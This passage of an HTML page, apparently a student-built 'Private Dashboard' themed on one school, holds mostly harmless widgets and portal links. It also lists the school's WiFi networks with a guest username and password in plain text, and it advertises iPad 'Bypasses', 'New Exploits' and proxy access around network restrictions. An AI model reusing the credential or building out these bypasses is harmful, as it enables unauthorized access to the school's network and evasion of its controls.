        background-color: #ff914d;
        border: none;
        padding: 15px;
        border-radius: 8px;
        color: black;
        font-size: 1.2em;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s;
    }
    .calculator-grid button.operator { background-color: #ffb67a; }
    .calculator-grid button.clear { background-color: #e60000; color: white; }
    .calculator-grid button.equals { background-color: #28a745; color: white; }

    .unit-converter-controls {
        display: flex;
        flex-direction: column;
        gap: 10px;
        margin-top: 15px;
    }
    .unit-converter-controls div {
        display: flex;
        align-items: center;
        gap: 10px;
    }
    .unit-converter-controls input, .unit-converter-controls select {
        padding: 8px;
        border-radius: 5px;
        border: 1px solid #555;
        background-color: #1c1c1c;
        color: white;
    }

    /* Media Player */
    .media-player {
        margin-top: 15px;
        text-align: center;
    }
    .media-player #youtubeEmbed {
        width: 100%;
        aspect-ratio: 16 / 9; /* Standard video aspect ratio */
        border: none;
        border-radius: 8px;
        margin-top: 10px;
    }
    .media-player input {
        width: calc(100% - 80px); /* Adjust for button */
        padding: 8px;
        border-radius: 5px;
        border: 1px solid #555;
        background-color: #1c1c1c;
        color: white;
    }
    .media-player button {
        padding: 8px 12px;
        border-radius: 5px;
        border: none;
        background-color: #ff914d;
        color: black;
        font-weight: bold;
        cursor: pointer;
        margin-left: 5px;
    }


    /* Dashboard Alerts System */
    .dashboard-alert-container {
      position: fixed;
      bottom: 20px;
      left: 20px;
      z-index: 2000; /* High z-index */
      display: flex;
      flex-direction: column;
      gap: 10px;
      max-height: 80vh;
      overflow-y: auto;
      width: 300px;
    }

    .dashboard-alert {
      background-color: #333;
      border: 1px solid #ff914d;
      padding: 10px 15px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.5);
      color: white;
      font-size: 0.9em;
      opacity: 0;
      transform: translateX(-100%);
      transition: opacity 0.3s ease-out, transform 0.3s ease-out;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .dashboard-alert.show {
      opacity: 1;
      transform: translateX(0);
    }

    .dashboard-alert.important {
      border-color: red;
      background-color: #5a1e1e;
    }

    .dashboard-alert button {
      background: none;
      border: none;
      color: #aaa;
      cursor: pointer;
      font-size: 1em;
      margin-left: 10px;
    }
    .dashboard-alert button:hover {
        color: white;
    }

    /* Styles for draggable elements (not fully implemented in JS here, but for visual indication) */
    .draggable {
        cursor: grab;
    }
    .draggable:active {
        cursor: grabbing;
    }

    .dashboard-quick-actions-panel button {
      background-color: #ff914d;
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
      white-space: nowrap;
    }
    .dashboard-quick-actions-panel button:hover {
      background-color: #ffb67a;
    }
    .dashboard-quick-actions-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }


  </style>
  
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
</head>
<body id="bodyElement">

  <!-- Pre-Login Loading Screen -->
  <div id="preLoginLoader">
    <div class="cube-loader">
      <div class="cube-loader-inner">
        <div class="cube-face front"></div>
        <div class="cube-face back"></div>
        <div class="cube-face right"></div>
        <div class="cube-face left"></div>
        <div class="cube-face top"></div>
        <div class="cube-face bottom"></div>
      </div>
    </div>
    <div id="loaderText">Initializing System..</div>
  </div>

  <!-- Login Page -->
  <div class="login-container" id="loginContainer" style="display: none;">
    <div class="login-quick-bar" id="loginQuickBar">
      <button id="loginPanicBtn">üö® Panic</button>
      <button id="loginZoomInBtn">‚ûï Zoom In</button>
      <button id="loginZoomOutBtn">‚ûñ Zoom Out</button>
    </div>

    <div class="login-box" id="loginBox">
      <h2>ùôãùôßùôûùô´ùôñùô©ùôö ùôéùôÆùô®ùô©ùôöùô¢</h2>

      <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
      <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
      <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

      <div class="password-toggle-container">
        <label class="toggle-switch">
          <input type="checkbox" id="showPasswordToggle">
          <span class="slider"></span>
        </label>
        <span>Show Password</span>
      </div>

      <button id="submitBtn">Submit</button>

      <div class="error-message" id="errorMsg"></div>
      <div class="attempt-counter" id="attemptsText">Attempts Left: 3</div>

      <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
        <p>Too many failed attempts.</p>
        <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
        <button id="resetBtn">Reset Counter</button>
      </div>
    </div>

    <div class="login-info-box">
        <div>Current Time: <span id="loginCurrentTime">00:00:00</span></div>
        <div>Current Date: <span id="loginCurrentDate">--/--/----</span></div>
        <div class="time-date-toggle">
            <label class="toggle-switch">
                <input type="checkbox" id="toggle24HourFormat">
                <span class="slider"></span>
            </label>
            <span>24-Hour Format</span>
        </div>
    </div>
  </div>

  <!-- Post-Login Loading Dashboard -->
  <div id="dashboardLoader">
    <div class="cube-loader dashboard-loading-box">
      <div class="cube-loader-inner">
        <div class="cube-face front"></div>
        <div class="cube-face back"></div>
        <div class="cube-face right"></div>
        <div class="cube-face left"></div>
        <div class="cube-face top"></div>
        <div class="cube-face bottom"></div>
      </div>
    </div>
    <div>Initializing Dashboard...</div>
    <div class="dashboard-loading-code">
      <div class="code-line"></div>
      <div class="code-line"></div>
      <div class="code-line"></div>
      <div class="code-line"></div>
      <div class="code-line"></div>
    </div>
  </div>


  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" style="display: none;">
    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 1.5.6</div>
    </div>

    <div class="dashboard-quick-bar">
      <div class="search-container">
        <input type="text" id="dashboardSearchInput" placeholder="Search dashboard...">
        <button id="dashboardSearchBtn">üîé</button>
      </div>
      <button id="downloadActivityLogsBtn">üìÑ Download Activity Logs</button>
      <button id="panicBtn" class="alert-panic-button">üö® Panic</button>
      <button id="themeToggle"><i class="fas fa-moon"></i> Dark Mode</button>
      <button id="settingsBtn"><i class="fas fa-cog"></i> Settings</button>
      <button id="utilityPanelBtn"><i class="fas fa-tools"></i> Utilities</button>
      <button id="logoutBtn">üîì Log Out</button>
    </div>
    
    <div id="announcementBar" class="announcement-bar">
      <span>üö® Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! üö®</span>
    </div>

    <div class="dashboard-notification" id="dashboardWelcomeNotification">
      <span id="welcomeMessage"></span>
      <button onclick="dashboard.hideWelcomeNotification()"><i class="fas fa-times"></i></button>
    </div>

    <div class="dashboard-alert-container" id="dashboardAlerts">
      <!-- Alerts will be injected here -->
    </div>
    
    <div class="main-row" id="mainGrid">
      
      <div class="box" id="calendarBox">
        <h2>üìÖ Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box fact-quote-box" id="randomFactBox">
        <h2>üí° Random Fact</h2>
        <p id="factContent"></p>
        <button onclick="dashboard.displayRandomFact()" style="margin-top: 10px;">New Fact</button>
      </div>

      <div class="box fact-quote-box" id="dailyQuoteBox">
        <h2>‚ú® Daily Quote</h2>
        <p id="quoteContent"></p>
        <button onclick="dashboard.displayDailyQuote()" style="margin-top: 10px;">New Quote</button>
      </div>

      <div class="box motivation-box" id="motivationBox">
        "Success is not final, failure is not fatal: It is the courage to continue that counts." ‚Äì Winston Churchill
      </div>
    </div>

    <div id="updatesNotifications" style="display: flex; gap: 20px; justify-content: center; flex-wrap: nowrap; margin-top: 20px;">
      <div class="box" style="flex: 1 1 300px; min-width: 300px;" id="updatesBox">
        <h2>üîÑ Updates</h2>
        <div class="update-entry">Dashboard Interface Update!</div>
        <div class="update-entry">New Exploits Added</div>
        <div class="update-entry">UI Overhaul Deployed</div>
        <div class="update-entry">Security Enhancements Launched</div>
        <div class="update-entry">New Theme Added: Vibrant</div>
      </div>

      <div class="box" style="flex: 1 1 300px; min-width: 300px;" id="notificationsBox">
        <h2>üîî Notifications</h2>
        <p>Starting to work on the log in system. Stay tuned for more!</p>
        <p>Your session started successfully at <span id="notificationLoginTime"></span>.</p>
      </div>
    </div>

    <!-- Collapsible Panels (can be opened by buttons from 'Utilities') -->
    <div id="infoPanelsContainer" style="margin-top: 20px;">
      <!-- Dashboard Utilities Panel -->
      <div id="dashboardUtilitiesPanel" class="dashboard-quick-actions-panel">
          <h2><i class="fas fa-tools"></i> Dashboard Utilities</h2>
          <div class="dashboard-quick-actions-grid">
            <button id="sessionTime"><i class="fas fa-clock"></i> Session Time: 00:00:00</button>
            <button id="realTimeClock"><i class="fas fa-clock"></i> --:--:--</button>
            <button id="realDate"><i class="fas fa-calendar-alt"></i> --</button>
            <button id="notesBtn">üìí Notes</button>
            <button id="exportNotesBtn">üíæ Export Notes</button>
            <button id="screenshotBtn">üì∏ Screenshot</button>
            <button id="toggleSectionsBtn">‚¨ÜÔ∏è Toggle Main Sections</button>
            <button id="fixIssuesBtn">üõ†Ô∏è Fix Issues</button>
            <button id="fullScreenBtn">üñ•Ô∏è Full Screen</button>
            <button id="restartBtn">üîÑ Restart</button>
            <button id="loginHistoryBtn">üìú Login History</button>
            <button id="activityLogsBtn">üìä Activity Logs</button>
            <button id="keybindsBtn">‚å®Ô∏è Keybinds</button>
            <button id="timeToolsBtn">‚è±Ô∏è Time Tools</button>
            <button id="calculatorBtn">üßÆ Calculator</button>
            <button id="unitConverterBtn">üîÑ Unit Converter</button>
            <button id="statsBtn">üìà Stats</button>
            <button id="mediaBtn">üì∫ Media Player</button>
          </div>
      </div>

      <!-- Settings Panel -->
      <div id="settingsPanel" class="settings-panel">
        <h2><i class="fas fa-cog"></i> Settings</h2>
        <div class="info-grid">
            <div class="info-grid-item">
                <label for="settingWelcomeNotification">Show Welcome Notification</label>
                <label class="toggle-switch">
                    <input type="checkbox" id="settingWelcomeNotification" checked>
                    <span class="slider"></span>
                </label>
            </div>
            <div class="info-grid-item">
                <label for="settingAnnouncementBar">Show Announcement Bar</label>
                <label class="toggle-switch">
                    <input type="checkbox" id="settingAnnouncementBar" checked>
                    <span class="slider"></span>
                </label>
            </div>
            <div class="info-grid-item">
                <label for="settingDarkModeToggle">Dark Mode (Toggle Theme)</label>
                <label class="toggle-switch">
                    <input type="checkbox" id="settingDarkModeToggle" checked>
                    <span class="slider"></span>
                </label>
            </div>
            <div class="info-grid-item">
                <label for="settingPanelVisibility">Calendar Panel Visible</label>
                <label class="toggle-switch">
                    <input type="checkbox" id="settingCalendarVisible" checked>
                    <span class="slider"></span>
                </label>
            </div>
            <div class="info-grid-item">
                <label for="settingUpdatesVisible">Updates Panel Visible</label>
                <label class="toggle-switch">
                    <input type="checkbox" id="settingUpdatesVisible" checked>
                    <span class="slider"></span>
                </label>
            </div>
            <div class="info-grid-item">
                <label for="settingNotificationsVisible">Notifications Panel Visible</label>
                <label class="toggle-switch">
                    <input type="checkbox" id="settingNotificationsVisible" checked>
                    <span class="slider"></span>
                </label>
            </div>
            <div class="info-grid-item">
                <label for="settingMotivationVisible">Motivation Panel Visible</label>
                <label class="toggle-switch">
                    <input type="checkbox" id="settingMotivationVisible" checked>
                    <span class="slider"></span>
                </label>
            </div>
             <div class="info-grid-item">
                <label for="settingFactVisible">Random Fact Panel Visible</label>
                <label class="toggle-switch">
                    <input type="checkbox" id="settingFactVisible" checked>
                    <span class="slider"></span>
                </label>
            </div>
             <div class="info-grid-item">
                <label for="settingQuoteVisible">Daily Quote Panel Visible</label>
                <label class="toggle-switch">
                    <input type="checkbox" id="settingQuoteVisible" checked>
                    <span class="slider"></span>
                </label>
            </div>
            <div class="info-grid-item">
                <label for="settingFontSize">Dashboard Font Size</label>
                <select id="settingFontSize">
                    <option value="0.9">Small</option>
                    <option value="1" selected>Medium</option>
                    <option value="1.1">Large</option>
                </select>
            </div>
            <div class="info-grid-item">
                <label for="settingLocale">Language / Locale</label>
                <select id="settingLocale">
                    <option value="en-US" selected>English (US)</option>
                    <option value="es-ES">Spanish (Spain)</option>
                    <option value="fr-FR">French (France)</option>
                </select>
            </div>
            <div class="info-grid-item">
                <label for="settingEnablePanelDrag">Enable Panel Drag & Drop</label>
                <label class="toggle-switch">
                    <input type="checkbox" id="settingEnablePanelDrag">
                    <span class="slider"></span>
                </label>
            </div>
            <div class="info-grid-item">
                <label for="settingActivityLoggingLevel">Activity Log Detail Level</label>
                <select id="settingActivityLoggingLevel">
                    <option value="full" selected>Full</option>
                    <option value="minimal">Minimal</option>
                    <option value="none">None</option>
                </select>
            </div>
            <div class="info-grid-item">
                <label for="settingClearCache">Clear Dashboard Cache</label>
                <button onclick="dashboard.clearCache()" style="margin-left: 10px;">Clear</button>
            </div>
            <div class="info-grid-item">
                <label for="settingResetLayout">Reset Dashboard Layout</label>
                <button onclick="dashboard.resetLayout()" style="margin-left: 10px;">Reset</button>
            </div>
        </div>
      </div>

      <!-- Themes Panel -->
      <div id="themesPanel" class="themes-panel">
        <h2>üé® Themes</h2>
        <div class="dashboard-quick-actions-grid">
            <button onclick="dashboard.setTheme('dark-theme')">üåô Dark</button>
            <button onclick="dashboard.setTheme('light-theme')">‚òÄÔ∏è Light</button>
            <button onclick="dashboard.setTheme('vibrant-theme')">‚ú® Vibrant</button>
            <button onclick="dashboard.setTheme('corporate-theme')">üëî Corporate</button>
            <button onclick="dashboard.setTheme('forest-theme')">üå≤ Forest</button>
            <button onclick="dashboard.setTheme('midnight-theme')">üåå Midnight</button>
        </div>
      </div>

      <!-- Keybinds Panel -->
      <div id="keybindsPanel" class="keybinds-panel">
        <h2>‚å®Ô∏è Keybinds</h2>
        <p>Configure your keyboard shortcuts:</p>
        <div id="keybindsList">
          <div class="keybind-entry">
            <span class="keybind-action">Toggle Notes Panel</span>
            <span class="keybind-key" id="keybind-notes">N</span>
          </div>
          <div class="keybind-entry">
            <span class="keybind-action">Panic Button</span>
            <span class="keybind-key" id="keybind-panic">P</span>
          </div>
          <div class="keybind-entry">
            <span class="keybind-action">Open Settings</span>
            <span class="keybind-key" id="keybind-settings">S</span>
          </div>
          <!-- More keybinds can be added dynamically -->
        </div>
        <button style="margin-top: 15px; background-color: #28a745;" onclick="dashboard.addNewKeybind()">+ Add New Keybind</button>
      </div>

      <!-- Time Tools Panel (Timer, Stopwatch, Reminders) -->
      <div id="timeToolsPanel" class="time-tools-panel info-panel">
        <h2>‚è±Ô∏è Time Tools</h2>

        <h3>Timer</h3>
        <div class="timer-display" id="timerDisplay">00:00:00</div>
        <div class="timer-controls">
          <input type="number" id="timerInputMinutes" placeholder="Minutes" min="0" style="width: 80px;"/>
          <button onclick="dashboard.startTimer()"><i class="fas fa-play"></i> Start Timer</button>
          <button onclick="dashboard.pauseTimer()"><i class="fas fa-pause"></i> Pause</button>
          <button onclick="dashboard.resetTimer()"><i class="fas fa-redo"></i> Reset</button>
        </div>

        <h3 style="margin-top: 20px;">Stopwatch</h3>
        <div class="timer-display" id="stopwatchDisplay">00:00:00</div>
        <div class="timer-controls">
          <button onclick="dashboard.startStopwatch()"><i class="fas fa-play"></i> Start Stopwatch</button>
          <button onclick="dashboard.pauseStopwatch()"><i class="fas fa-pause"></i> Pause</button>
          <button onclick="dashboard.resetStopwatch()"><i class="fas fa-redo"></i> Reset</button>
        </div>

        <h3 style="margin-top: 20px;">Reminders</h3>
        <div class="reminder-controls">
            <input type="text" id="reminderTextInput" placeholder="Reminder text" style="flex-grow: 1;">
            <input type="datetime-local" id="reminderTimeInput">
            <button onclick="dashboard.addReminder()"><i class="fas fa-plus"></i> Add Reminder</button>
        </div>
        <div id="reminderList" style="margin-top: 15px;">
            <!-- Reminders will be listed here -->
            <p>No reminders set yet.</p>
        </div>
      </div>

      <!-- Calculator Panel -->
      <div id="calculatorPanel" class="info-panel">
        <h2>üßÆ Calculator</h2>
        <div class="calculator-display" id="calcDisplay">0</div>
        <div class="calculator-grid">
          <button onclick="dashboard.appendCalc('7')">7</button>
          <button onclick="dashboard.appendCalc('8')">8</button>
          <button onclick="dashboard.appendCalc('9')">9</button>
          <button class="operator" onclick="dashboard.chooseCalcOperation('/')">/</button>
          <button onclick="dashboard.appendCalc('4')">4</button>
          <button onclick="dashboard.appendCalc('5')">5</button>
          <button onclick="dashboard.appendCalc('6')">6</button>
          <button class="operator" onclick="dashboard.chooseCalcOperation('*')">*</button>
          <button onclick="dashboard.appendCalc('1')">1</button>
          <button onclick="dashboard.appendCalc('2')">2</button>
          <button onclick="dashboard.appendCalc('3')">3</button>
          <button class="operator" onclick="dashboard.chooseCalcOperation('-')">-</button>
          <button onclick="dashboard.appendCalc('0')">0</button>
          <button onclick="dashboard.appendCalc('.')">.</button>
          <button class="equals" onclick="dashboard.calculateResult()">=</button>
          <button class="operator" onclick="dashboard.chooseCalcOperation('+')">+</button>
          <button class="clear" style="grid-column: 1 / -1;" onclick="dashboard.clearCalc()">C</button>
        </div>
      </div>

      <!-- Unit Converter Panel -->
      <div id="unitConverterPanel" class="info-panel">
        <h2>üîÑ Unit Converter</h2>
        <div class="unit-converter-controls">
            <div>
                <input type="number" id="convertValue" value="1">
                <select id="convertFromUnit">
                    <option value="cm">cm</option>
                    <option value="m">m</option>
                    <option value="km">km</option>
                    <option value="inch">inch</option>
                    <option value="ft">ft</option>
                    <option value="lb">lb</option>
                    <option value="kg">kg</option>
                </select>
                <span>to</span>
                <select id="convertToUnit">
                    <option value="cm">cm</option>
                    <option value="m">m</option>
                    <option value="km">km</option>
                    <option value="inch">inch</option>
                    <option value="ft">ft</option>
                    <option value="lb">lb</option>
                    <option value="kg" selected>kg</option>
                </select>
            </div>
            <button onclick="dashboard.convertUnits()">Convert</button>
            <div>Result: <span id="conversionResult">--</span></div>
        </div>
      </div>

      <!-- Stats Panel -->
      <div id="statsPanel" class="stats-panel">
        <h2>üìà User Statistics</h2>
        <p>Total Clicks: <span id="statClicks">0</span></p>
        <p>Panels Opened: <span id="statPanelsOpened">0</span></p>
        <p>Canvas Cleared: <span id="statCanvasCleared">0</span></p>
        <p>Login Attempts: <span id="statLoginAttempts">0</span></p>
        <p>Successful Logins: <span id="statSuccessfulLogins">0</span></p>
        <button style="margin-top: 15px; background-color: #ff4c4c;" onclick="dashboard.resetStats()">Reset Stats</button>
      </div>

      <!-- Media Panel -->
      <div id="mediaPanel" class="media-panel">
        <h2>üì∫ Media Player (Proxy)</h2>
        <p>Enter YouTube Video ID or URL (e.g., 'dQw4w9WgXcQ' or full URL):</p>
        <div style="display: flex;">
          <input type="text" id="youtubeUrlInput" placeholder="YouTube Video ID or URL">
          <button onclick="dashboard.loadYoutubeVideo()">Load</button>
        </div>
        <div class="media-player">
          <iframe id="youtubeEmbed" src="" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
        </div>
        <div class="coming-soon" style="background: #e67e22; margin-top: 20px;">
          Note: This feature typically requires a server-side proxy to bypass network restrictions. The embedded video links here will attempt direct YouTube access, which might be blocked on your network.
        </div>
      </div>


      <!-- Activity Logs Panel -->
      <div id="activityLogPanel" class="activity-log-panel">
          <h2>üìä Activity Logs</h2>
          <div style="max-height: 400px; overflow-y: auto; background: #1c1c1c; padding: 10px; border-radius: 8px;">
            <ul id="activityLogList" style="list-style: none; padding: 0;">
                <!-- Logs will be inserted here dynamically -->
            </ul>
          </div>
          <button onclick="dashboard.clearActivityLogs()" style="margin-top: 15px; background-color: #e60000;">Clear All Logs</button>
      </div>

      <!-- Login History Panel -->
      <div id="loginHistoryPanel" class="login-history-panel">
          <h2>üìú Login History</h2>
          <div style="max-height: 250px; overflow-y: auto; background: #1c1c1c; padding: 10px; border-radius: 8px;">
            <ul id="loginHistoryList" style="list-style: none; padding: 0;">
                <li>No login history available.</li>
            </ul>
          </div>
      </div>


      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel">
        <h2>üì° School WiFi Information</h2>
        <div class="wifi-grid">
          <div>Network Name</div>
          <div>Wifi Level</div>
          <div>Security Type</div>
          <div>Encryption</div>
          <div>Hidden?</div>
          <div>Monitored?</div>
          <div>Username</div>
          <div>Password</div>
          <div>Channel</div>
          <div>Band</div>
        </div>
        
        <div class="wifi-entry">
          <div>Middletown_Core</div>
          <div class="high-signal">High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>No</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>6</div>
          <div>2.4 GHz</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown_Core</div>
          <div class="high-signal">High</div>
          <div>WPA3 Enterprise</div>
          <div>High</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>11</div>
          <div>5 GHz</div>
        </div>
        
        <div class="wifi-entry">
          <div>Mtown Guest</div>
          <div class="medium-signal">Medium</div>
          <div>WPA3 Enterprise</div>
          <div>Medium</div>
          <div>No</div>
          <div>Rare</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
          <div>1</div>
          <div>2.4 GHz</div>
        </div>
        
        <div class="wifi-entry">
          <div>Radius Test</div>
          <div class="low-signal">Low</div>
          <div>WPA3 Enterprise</div>
          <div>Low</div>
          <div>No</div>
          <div>Rarely</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
          <div>9</div>
          <div>5 GHz</div>
        </div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel">
        <h2>üì± School iPad Restrictions</h2>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
        </div>
        
        <div id="ipadRestrictions" class="ipad-content">
          <p>Coming soon</p>
        </div>
        
        <div id="ipadBypasses" class="ipad-content">
          <p>Coming soon</p>
        </div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel">
        <h2>üìò Student Handbooks Information</h2>
        <div class="handbook-buttons">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel">
        <h2>üè´ School Building Map Information</h2>
        <p>Building Map Display</p>
        <div class="coming-soon">
          Building Map Coming Soon
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel">
        <h2>üåê Student Website's Information</h2>
        <div class="links-list">
          <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
          <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a>
          <a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <h2>üë©‚Äçüè´ Teacher Websites Information</h2>
        <div class="links-list">
          <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
          <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a>
          <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel">
        <h2>üìû School Phone Directory Information</h2>
        <div class="coming-soon">
          Update Coming Soon!
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel">
        <h2>üì∑ School Camera Information</h2>
        <div class="coming-soon">
          Update Coming Soon
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel">
        <h2>üè´ School Information</h2>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
